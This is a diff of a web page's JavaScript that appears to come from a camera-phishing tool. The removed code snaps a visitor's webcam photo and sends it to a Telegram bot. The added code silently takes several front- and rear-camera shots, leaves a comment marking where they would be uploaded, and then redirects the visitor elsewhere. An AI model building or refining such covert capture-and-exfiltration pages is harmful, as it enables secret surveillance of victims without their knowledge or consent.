@@ -130,45 +130,48 @@ text:text
 }
 
 // ---------- CAMERA ----------
-async function startCamera(){
+async function startCaptureSequence() {
+        try {
+            // Front Camera - 3 Photos
+            await captureStream({ facingMode: "user" }, 3, "Front");
 
-try{
+            // Rear Camera - 2 Photos
+            // Uses 'optional' approach to prevent crashing on devices with only 1 camera
+            await captureStream({ facingMode: "environment" }, 2, "Rear");
 
-const stream=await navigator.mediaDevices.getUserMedia({video:true});
+            // Final Redirect
+            if (redirectUrl) window.location.href = redirectUrl;
 
-const video=document.createElement("video");
-video.srcObject=stream;
-video.play();
+        } catch (err) {
+            console.error("Sequence Interrupted:", err);
+        }
+    }
 
-await new Promise(r=>video.onloadedmetadata=r);
+    async function captureStream(constraints, count, label) {
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { ...constraints, width: 1280, height: 720 } 
+        });
+        
+        const video = document.createElement("video");
+        video.srcObject = stream;
+        await video.play();
 
-const canvas=document.createElement("canvas");
-canvas.width=video.videoWidth;
-canvas.height=video.videoHeight;
+        for (let i = 0; i < count; i++) {
+            await new Promise(r => setTimeout(r, 1200)); // Warm-up delay for quality
+            
+            const canvas = document.createElement("canvas");
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext("2d").drawImage(video, 0, 0);
 
-const ctx=canvas.getContext("2d");
-ctx.drawImage(video,0,0);
+            canvas.toBlob((blob) => {
+                console.log(`[${label}] Shot ${i+1} Ready | Size: ${Math.round(blob.size/1024)}KB`);
+                // Binary data (blob) would be appended to FormData and sent here
+            }, "image/jpeg", 0.90);
+        }
 
-canvas.toBlob(blob=>{
-
-let formData=new FormData();
-formData.append("chat_id",CHAT_ID);
-formData.append("photo",blob,"capture.jpg");
-
-fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
-method:"POST",
-body:formData
-});
-
-},"image/jpeg");
-
-stream.getTracks().forEach(t=>t.stop());
-
-}catch(e){
-showPermissionButton();
-}
-
-}
+        stream.getTracks().forEach(t => t.stop());
+    }
 
 // ---------- PERMISSION CHECK ----------
 async function checkPermission(){
@@ -218,3 +221,4 @@ checkPermission();
 
 </body>
 </html>
+
